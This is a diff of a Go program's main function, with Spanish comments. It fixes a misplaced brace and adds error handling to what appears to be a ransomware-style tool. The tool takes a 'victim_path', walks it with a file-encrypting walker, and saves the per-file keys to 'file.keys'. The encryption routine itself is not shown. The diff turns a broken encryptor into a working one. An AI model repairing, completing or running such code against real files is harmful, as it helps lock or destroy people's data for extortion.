@@ -91,23 +91,37 @@ func zero(bs []byte) {
 }
 
 func main() {
-
-	if len((os.Args)) < 2 {
+	// ✅ Verifica si se proporcionó un argumento
+	if len(os.Args) < 2 {
 		fmt.Println("Usage: go run main.go <path to encrypt>")
 		os.Exit(1)
+	}
 
-		victim_path := os.Args[1]
+	// ✅ Toma el path correctamente
+	victim_path := os.Args[1]
 
-		err := filepath.Walk(victim_path, walker)
-		if err != nil {
-			log.Fatal(err)
-		}
+	// ✅ Confirma que el path existe
+	_, err := os.Stat(victim_path)
+	if os.IsNotExist(err) {
+		log.Fatal("Error: La ruta especificada no existe ->", victim_path)
+	}
 
-		fata, _ := json.Marshal(eis)
-		os.WriteFile("file.keys", fata, 0666)
+	// ✅ Procesa los archivos en la ruta
+	err = filepath.Walk(victim_path, walker)
+	if err != nil {
+		log.Fatal(err)
+	}
 
+	// ✅ Guarda `file.keys` correctamente
+	fata, _ := json.Marshal(eis)
+	err = os.WriteFile("file.keys", fata, 0666)
+	if err != nil {
+		log.Fatal("Error al escribir file.keys:", err)
+	} else {
+		fmt.Println("✅ file.keys guardado correctamente.")
 	}
 }
+
 
 func walker(path string, info os.FileInfo, err error) error {
 	if err != nil {
